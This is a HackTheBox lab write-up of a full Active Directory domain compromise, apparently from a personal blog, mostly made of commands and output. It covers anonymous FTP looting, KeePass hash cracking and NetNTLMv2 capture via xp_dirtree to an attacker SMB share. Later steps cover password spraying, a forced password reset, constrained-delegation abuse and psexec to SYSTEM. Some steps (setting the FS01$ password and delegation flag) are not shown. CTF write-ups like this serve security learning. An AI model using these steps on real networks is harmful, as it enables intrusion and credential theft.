---
title: 'HackTheBox | Redelegate'
published: 2026-10-2
draft: false
description: 'HackTheBox Machine `Redelegate` writeup.'
tags: ['HackTheBox', 'windows', 'active-directory', 'SeEnableDelegationPrivilege']
---

## Recon

### Port Scanning

```
# Nmap 7.95 scan initiated Thu Oct  1 03:20:45 2026 as: nmap -sC -sV -p21,53,80,88,135,139,389,445,464,593,636,1433,3268,3269,3389,5985,7848,9389,21239,24484,24695,25707,34026,47001,49664,49665,49666,49667,49669,49932,51645,51646,51652,51662,51664,52307 -Pn -n -vv -oN nmap/tcp_deep 10.129.234.50
Nmap scan report for 10.129.234.50
Host is up, received user-set (0.17s latency).
Scanned at 2026-10-01 03:20:46 EDT for 80s

PORT      STATE  SERVICE       REASON       VERSION
21/tcp    open   ftp           syn-ack      Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 10-20-24  01:11AM                  434 CyberAudit.txt
| 10-20-24  05:14AM                 2622 Shared.kdbx
|_10-20-24  01:26AM                  580 TrainingAgenda.txt
| ftp-syst:
|_  SYST: Windows_NT
53/tcp    open   domain        syn-ack      Simple DNS Plus
80/tcp    open   http          syn-ack      Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open   kerberos-sec  syn-ack      Microsoft Windows Kerberos (server time: 2026-10-01 07:19:53Z)
135/tcp   open   msrpc         syn-ack      Microsoft Windows RPC
139/tcp   open   netbios-ssn   syn-ack      Microsoft Windows netbios-ssn
389/tcp   open   ldap          syn-ack      Microsoft Windows Active Directory LDAP (Domain: redelegate.vl0., Site: Default-First-Site-Name)
445/tcp   open   microsoft-ds? syn-ack
464/tcp   open   kpasswd5?     syn-ack
593/tcp   open   ncacn_http    syn-ack      Microsoft Windows RPC over HTTP 1.0
636/tcp   open   tcpwrapped    syn-ack
1433/tcp  open   ms-sql-s      syn-ack      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-10-01T07:18:08
| Not valid after:  2056-10-01T07:18:08
| MD5:   409d:67f7:5b37:5524:cf51:861e:a072:84ba
| SHA-1: e209:87cd:0a87:c83b:1239:cd97:e12f:9c41:b2cc:9878
| -----BEGIN CERTIFICATE-----
<SNIP>
|_-----END CERTIFICATE-----
|_ssl-date: 2026-10-01T07:21:00+00:00; -59s from scanner time.
3268/tcp  open   ldap          syn-ack      Microsoft Windows Active Directory LDAP (Domain: redelegate.vl0., Site: Default-First-Site-Name)
3269/tcp  open   tcpwrapped    syn-ack
3389/tcp  open   ms-wbt-server syn-ack      Microsoft Terminal Services
|_ssl-date: 2026-10-01T07:21:00+00:00; -59s from scanner time.
| ssl-cert: Subject: commonName=dc.redelegate.vl
| Issuer: commonName=dc.redelegate.vl
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-09-30T07:15:32
| Not valid after:  2027-04-01T07:15:32
| MD5:   7f98:ac9a:4e34:0062:14f0:05c7:05e9:a2a4
| SHA-1: 2781:99f0:3c61:cefd:ba82:1480:32f9:3695:7eb5:29cf
| -----BEGIN CERTIFICATE-----
<SNIP>
|_-----END CERTIFICATE-----
| rdp-ntlm-info:
|   Target_Name: REDELEGATE
|   NetBIOS_Domain_Name: REDELEGATE
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: redelegate.vl
|   DNS_Computer_Name: dc.redelegate.vl
|   DNS_Tree_Name: redelegate.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-10-01T07:20:51+00:00
5985/tcp  open   http          syn-ack      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
7848/tcp  closed unknown       conn-refused
9389/tcp  open   mc-nmf        syn-ack      .NET Message Framing
21239/tcp closed unknown       conn-refused
24484/tcp closed unknown       conn-refused
24695/tcp closed unknown       conn-refused
25707/tcp closed unknown       conn-refused
34026/tcp closed unknown       conn-refused
47001/tcp open   http          syn-ack      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open   msrpc         syn-ack      Microsoft Windows RPC
49665/tcp open   msrpc         syn-ack      Microsoft Windows RPC
49666/tcp open   msrpc         syn-ack      Microsoft Windows RPC
49667/tcp open   msrpc         syn-ack      Microsoft Windows RPC
49669/tcp open   msrpc         syn-ack      Microsoft Windows RPC
49932/tcp open   ms-sql-s      syn-ack      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-10-01T07:18:08
| Not valid after:  2056-10-01T07:18:08
| MD5:   409d:67f7:5b37:5524:cf51:861e:a072:84ba
| SHA-1: e209:87cd:0a87:c83b:1239:cd97:e12f:9c41:b2cc:9878
| -----BEGIN CERTIFICATE-----
<SNIP>
|_-----END CERTIFICATE-----
|_ssl-date: 2026-10-01T07:21:00+00:00; -59s from scanner time.
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
51645/tcp open   ncacn_http    syn-ack      Microsoft Windows RPC over HTTP 1.0
51646/tcp open   msrpc         syn-ack      Microsoft Windows RPC
51652/tcp open   msrpc         syn-ack      Microsoft Windows RPC
51662/tcp open   msrpc         syn-ack      Microsoft Windows RPC
51664/tcp open   msrpc         syn-ack      Microsoft Windows RPC
52307/tcp open   msrpc         syn-ack      Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2026-10-01T07:20:53
|_  start_date: N/A
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 41886/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 12875/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 15429/udp): CLEAN (Timeout)
|   Check 4 (port 64339/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: -59s, deviation: 0s, median: -59s

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Oct  1 03:22:06 2026 -- 1 IP address (1 host up) scanned in 81.44 seconds

```

- **Nmap** shows a lot of open ports. From all of these, following are the interesting ones :
  - **Port 21 FTP** - Anonymous login allowed, nmap lists 3 files
  - **Port 53 DNS Server**
  - **Port 80** HTTP Web Server - Microsoft IIS/10.0
  - **Port 88 Kerberos**
  - **Port 135/139/445 - SMB**
  - **Port 88/636** - LDAP/LDAPS
  - **Port 1433 - MSSQL Server**
  - **Port 3389 RDP**
  - **Port 5985 WinRM**
- **Domain Name** - `redelegate.vl`
- **Hostname** - `dc.redelegate.vl`

I'll use `netexec` to generate a hosts file and add it to my `/etc/hosts` file

```shell
$ nxc smb $IP --generate-hosts-file host.txt
SMB         10.129.234.50   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:redelegate.vl) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
$ cat host.txt | sudo tee -a /etc/hosts
10.129.234.50     DC.redelegate.vl redelegate.vl DC
```

### FTP Enumeration

- I'll use the anonymous access to FTP to get all the files locally.
- Set the mode to `binary` before transferring `Shared.kdbx` file.

```shell
$ ftp $IP
Connected to 10.129.234.50.
220 Microsoft FTP Service
Name (10.129.234.50:conner): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls -la
229 Entering Extended Passive Mode (|||64717|)
125 Data connection already open; Transfer starting.
10-20-24  01:11AM                  434 CyberAudit.txt
10-20-24  05:14AM                 2622 Shared.kdbx
10-20-24  01:26AM                  580 TrainingAgenda.txt
226 Transfer complete.
ftp> get CyberAudit.txt
local: CyberAudit.txt remote: CyberAudit.txt
229 Entering Extended Passive Mode (|||64719|)
125 Data connection already open; Transfer starting.
100% |*****************************************************************************************************************|   434        2.70 KiB/s    00:00 ETA
226 Transfer complete.
434 bytes received in 00:00 (1.80 KiB/s)
ftp> get TrainingAgenda.txt
local: TrainingAgenda.txt remote: TrainingAgenda.txt
229 Entering Extended Passive Mode (|||64720|)
125 Data connection already open; Transfer starting.
100% |*****************************************************************************************************************|   580        3.65 KiB/s    00:00 ETA
226 Transfer complete.
580 bytes received in 00:00 (2.43 KiB/s)
ftp> binary
200 Type set to I.
ftp> get Shared.kdbx
local: Shared.kdbx remote: Shared.kdbx
229 Entering Extended Passive Mode (|||64723|)
150 Opening BINARY mode data connection.
100% |*****************************************************************************************************************|  2622       13.10 KiB/s    00:00 ETA
226 Transfer complete.
2622 bytes received in 00:00 (9.36 KiB/s)
ftp> bye
221 Goodbye.
```

- Reading these files `metadata` using `exiftool` does not reveals _any names_.

`CyberAudit.txt` content

```
OCTOBER 2024 AUDIT FINDINGS

[!] CyberSecurity Audit findings:

1) Weak User Passwords
2) Excessive Privilege assigned to users
3) Unused Active Directory objects
4) Dangerous Active Directory ACLs

[*] Remediation steps:

1) Prompt users to change their passwords: DONE
2) Check privileges for all users and remove high privileges: DONE
3) Remove unused objects in the domain: IN PROGRESS
4) Recheck ACLs: IN PROGRESS
```

`TrainingAgenda.txt` content

```
EMPLOYEE CYBER AWARENESS TRAINING AGENDA (OCTOBER 2024)

Friday 4th October  | 14.30 - 16.30 - 53 attendees
"Don't take the bait" - How to better understand phishing emails and what to do when you see one


Friday 11th October | 15.30 - 17.30 - 61 attendees
"Social Media and their dangers" - What happens to what you post online?


Friday 18th October | 11.30 - 13.30 - 7 attendees
"Weak Passwords" - Why "SeasonYear!" is not a good password


Friday 25th October | 9.30 - 12.30 - 29 attendees
"What now?" - Consequences of a cyber attack and how to mitigate them
```

- I'll note the `SeasonYear!` password format, and use it to spray against all the users.

`Shared.kdbx` is an encrypted `KeePass` database file. I'll extract its hash and try to crack it `rockyou.txt` wordlist or a custom wordlist created using the above password format.

```shell
$ keepass2john Shared.kdbx | tee Shared.kdbx.hash
Shared:$keepass$*2*600000*0*ce7395f413946b0cd279501e510cf8a988f39baca623dd86beaee651025662e6*e4f9d51a5df3e5f9ca1019cd57e10d60f85f48228da3f3b4cf1ffee940e20e01*18c45dbbf7d365a13d6714059937ebad*a59af7b75908d7bdf68b6fd929d315ae6bfe77262e53c209869a236da830495f*806f9dd2081c364e66a114ce3adeba60b282fc5e5ee6f324114d38de9b4502ca

$ john --wordlist=/usr/share/wordlists/rockyou.txt Shared.kdbx.hash
<SNIP>
Session aborted
```

- `rockyou.txt` wordlist was taking a long time and wouldn't have cracked the hash.
- I'll generate a custom wordlist based on the revealed password format, including seasons "Spring", "Fall","Summer","Winter" and "Autumn", and year from 2020-2025 (the year this box is released)

```shell
$ for year in {2020,2021,2022,2023,2024,2025}; do for season in {"Spring","Fall","Summer","Winter","Autumn"}; do echo "$season$year!"; done; done | tee SeasonsYear.txt
Spring2020!
Fall2020!
Summer2020!
Winter2020!
Autumn2020!
<SNIP>
```

- I'll use this generated wordlist to crack the hash again, and in seconds I get a hit.

```shell
$ john --wordlist=SeasonsYear.txt Shared.kdbx.hash
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 600000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Fall2024!        (Shared)
1g 0:00:00:00 DONE (2026-10-01 03:52) 1.176g/s 28.23p/s 28.23c/s 28.23C/s Spring2020!..Winter2024!
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

- The password is `Fall2024!`

#### Opening the `Shared.kdbx` database

- I'll install `keepass2` GUI application, and open the `Shared.kdbx` database in it, by entering the cracked master password.
- It has 3 folders and a total of 7 sets of credentials. I'll make a note of all of them.

![[Pasted image 20261001133102.png]]

```
[IT]
FTPUser \ SguPZBKdRyxWzvXRWy6U -> *deprecated*
**FS01 Admin** - Administrator \ Spdv41gg4BlBgSYIW1gF
**WEB01** - WordPress Panel \ cn4KOEgsHqvKXPjEnSD9
**SQL Guest Access** - SQLGuest \ zDPBpaF4FywlqIv11vii

[Finance]
**Timesheet Manager** -  Timesheet \ hMFS4I0Kj8Rcd62vqi5X
**Payroll App** - Payroll \ cVkqz4bCM7kJRSNlgx2G

[Helpdesk]
**KeyFob Combination** - <no_username> \ 22331144
```

---

### DNS Enumeration

- `redelegate.vl` and `dc.redelegate.vl` are the only 2 domains the DNS server reveals.
- `AXFR` requests are blocked
- No interesting `TXT` records either

---

### Web App @80

- The `GET` request for the IP address, `redelegate.vl` and `dc.redelegate.vl` domain all returns the default Microsoft IIS page

#### Subdomain Bruteforce / `vhost` Fuzzing

- No subdomains found

#### Directory Bruteforce

- No sub directories found

---

### MSSQL Enumeration

- Using the revealed password for the `MSSQL` server, I have access as `SQLGuest` user to the server

```shell
$ nxc mssql $IP -u SQLGuest -p 'zDPBpaF4FywlqIv11vii' --local-auth
MSSQL       10.129.234.50   1433   DC               [*] Windows Server 2022 Build 20348 (2019 RTM 15.0.2000) (name:DC) (domain:redelegate.vl) (EncryptionReq:False)
MSSQL       10.129.234.50   1433   DC               [+] DC\SQLGuest:zDPBpaF4FywlqIv11vii
```

- Next, I'll use `impacket-mssqlclient` to log in to the `MSSql Server`

```shell
$ impacket-mssqlclient SQLGuest:'zDPBpaF4FywlqIv11vii'@$IP
```

- I can enumerate databases, users , user logins, and also _links_, but nothing seems interesting.
- I'll use the `xp_dirtree` command to reveal the `NetNTLMv2` hash of the account running this server.

```shell
SQL (SQLGuest  guest@master)> xp_dirtree \\10.10.16.51\MyShare\test
subdirectory   depth   file
------------   -----   ----

$ sudo impacket-smbserver -smb2support MyShare ./
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
<SNIP>
[*] sql_svc::REDELEGATE:aaaaaaaaaaaaaaaa:19021299e3b92a0824855a7a96b6997a:01010000000000000044e2079c51dd0111e9b94c803baf2d0000000001001000470063006f004a006d0046005600700003001000470063006f004a006d00460056007000020010006d00470074005a00670042007a007300040010006d00470074005a00670042007a007300070008000044e2079c51dd0106000400020000000800300030000000000000000000000000300000716afcabce1c5f6c9e2e1682c7a6da3db34c8a7db9f2627632298e62f46358dd0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310036002e00350031000000000000000000
```

- I'll tried cracking this hash using the `rockyou.txt` wordlist and the custom wordlist I created before (including the passwords from the `KeePass` database), but it didn't worked

**RID Bruteforce**

- [HackTricks](https://hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server/index.html?searchbar=SeEnableDelegationPrivilege#user-enumeration-via-rid-brute-force) mentioned this trick to enumerate domain users through MSSQL by brute-forcing RIDs.

```shell
$ nxc mssql $IP -u SQLGuest -p 'zDPBpaF4FywlqIv11vii' --rid-brute
```

- From the output, I get the following list of users :

```
Christine.Flanders
Marie.Curie
Helen.Frost
Michael.Pontiac
Mallory.Roberts
James.Dinkleberg
Ryan.Cooper
sql_svc
```

---

## Exploitation

### Password Spray Attack

- Now that I have a list of users, I'll perform a password spray attack using the previous `SeasonsYear!` wordlist combined with list of passwords revealed from the `KeePass` database.

```shell
$ nxc smb $IP -u users.txt -p combined.lst --continue-on-success
SMB         10.129.234.50   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:redelegate.vl) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         10.129.234.50   445    DC               [-] redelegate.vl\Christine.Flanders:SguPZBKdRyxWzvXRWy6U STATUS_LOGON_FAILURE
<SNIP>
SMB         10.129.234.50   445    DC               [-] redelegate.vl\Mallory.Roberts:SguPZBKdRyxWzvXRWy6U STATUS_ACCOUNT_RESTRICTION
<SNIP>
SMB         10.129.234.50   445    DC               [+] redelegate.vl\Marie.Curie:Fall2024!
<SNIP>
```

- The attack found a single set of valid credentials : `Marie.Curie \ Fall2024!`
- There's also an account `Mallory.Roberts` which is restricted, probably an in-active account.

---

## BloodHound

- I'll use `NetExec` with `ldap` to collect data to ingest in bloodhound.

```shell
$ nxc ldap $IP -u Marie.Curie -p Fall2024! --bloodhound -c all --dns-server $IP
```

- Next, I'll add the zip file and mark `Marie.Curie` as **Owned** in bloodhound.
- `Marie.Curie` is a **Member of Helpdesk Group**, along with `Michael.Pontiac`.
- This group allows its members to **Force Change Password** of all the users, along with a `Guest` account :
  - Christine.Flanders
  - Marie.Curie
  - Helen.Frost
  - Michael.Pontiac
  - Mallory.Roberts
  - James.Dinkleberg
  - Ryan.Cooper
  - sql_svc
- Of all these users, `Helen.Frost` is a member of the `IT` group and has `GenericAll` over the `FS01.REDELEGATE.VL` computer.
- She is also a member of the `Remote Management Users` group which means she can log in with `winrm`

### Changing `Helen.Frost` account password

- I'll use `bloodyAD` to change her account's password, and set it to `Password@123$`

```shell
$ bloodyAD -u 'Marie.Curie' -d redelegate.vl -p 'Fall2024!' -i $IP set password 'Helen.Frost' 'Password@123$'
[+] Password changed successfully!
```

- I can confirm it using `nxc`

```shell
$ nxc winrm $IP -u Helen.Frost -p 'Password@123$'
WINRM       10.129.234.50   5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:redelegate.vl)
WINRM       10.129.234.50   5985   DC               [+] redelegate.vl\Helen.Frost:Password@123$ (Pwn3d!)
```

### Shell as `Helen.Frost`

- I'll use `evil-winrm` to log in as `Helen.Frost` , and read the `User Flag`

```shell
$ evil-winrm -i $IP -u 'Helen.Frost' -p 'Password@123$'
<SNIP>
*Evil-WinRM* PS C:\Users\Helen.Frost\Documents> cat ..\Desktop\user.txt
df2ad04ccbd9d29bb***************
```

---

## Privilege Escalation

I'll start from looking the available privileges for this user.

```shell
*Evil-WinRM* PS C:\Users\Helen.Frost\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                                                    State
============================= ============================================================== =======
SeMachineAccountPrivilege     Add workstations to domain                                     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                                       Enabled
SeEnableDelegationPrivilege   Enable computer and user accounts to be trusted for delegation Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set                                 Enabled
```

### `SeEnableDelegationPrivilege`

- The `SeEnableDelegationPrivilege` is a high-level privilege that is generally given to domain administrators.
- It lets a user mark another user or computer for **Kerberos Delegation**.

### Kerberos Delegation

- **Kerberos Delegation** lets a computer to authenticate to the KDC on behalf of a user.
- Say a user `Alice` authenticates to a web server `WEB01` , and the `WEB01` computer is marked for delegation by a domain admin, then this computer would be able to authenticate `Alice` to another computer/database server `SQL01` without needing for `Alice`'s credentials again
- The `WEB01` computer would save `Alice`'s TGT in its `lsass` memory. Then, any high privilege user on this computer could create a dump of `lsass` memory and extract all the saved tickets from it.

## Exploiting Kerberos Delegation

### Abusing Constrained Delegation

- I'll use `Helen.Frost`'s privileges to mark the computer `FS01.redelegate.vl` for delegation with the `uac flag` `TRUSTED_TO_AUTH_FOR_DELEGATION`
- This flag is used in **Constrained Delegation** and allows for **protocol transition** which in turn lets this computer to ask for a **Service Ticket** from KDC for _any account_.
- I'll also need to set a SPN in the `msDS-AllowedToDelegateTo` attribute on the computer.
  - This attribute is a list of SPNs the computer can authenticate to on behalf of the user.
  - There are multiple SPNs for different services on the domain controller :
    - `cifs/dc.redelegate.vl` - for SMB stuff (DCSync Attack)
    - `ldap/dc.redelegate.vl` - directory queries/writes
    - `http/dc.redelegate.vl` - WinRM
    - `TERMSRV/dc.redelegate.vl` - RDP
- I can do both these operations using `bloodyAD`

```shell
$ bloodyAD -d redelegate.vl -u 'Helen.Frost' -p 'Password@123$' -i $IP set object 'FS01$' 'msDS-AllowedToDelegateTo' -v 'cifs/dc.redelegate.vl'
[+] FS01$'s msDS-AllowedToDelegateTo has been updated
```

I'll impersonate the `Ryan.Cooper` user as he is a member of `Domain Admins` group

```shell
$ impacket-getST -spn 'cifs/dc.redelegate.vl' -impersonate Ryan.Cooper 'redelegate.vl/FS01$':'Password@123$'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
<SNIP>
[*] Requesting S4U2Proxy
[*] Saving ticket in Ryan.Cooper@cifs_dc.redelegate.vl@REDELEGATE.VL.ccache
```

Finally, I'll use the generated ticket with `psexec` to get a shell as `NT Authority\SYSTEM` and read the `Root` flag.

```shell
$ KRB5CCNAME=Ryan.Cooper@cifs_dc.redelegate.vl@REDELEGATE.VL.ccache impacket-psexec -k dc.redelegate.vl
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Requesting shares on dc.redelegate.vl.....
[*] Found writable share ADMIN$
[*] Uploading file JbryVQut.exe
[*] Opening SVCManager on dc.redelegate.vl.....
[*] Creating service TwMB on dc.redelegate.vl.....
[*] Starting service TwMB.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.3453]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
26c563f4dc7d043f****************
```
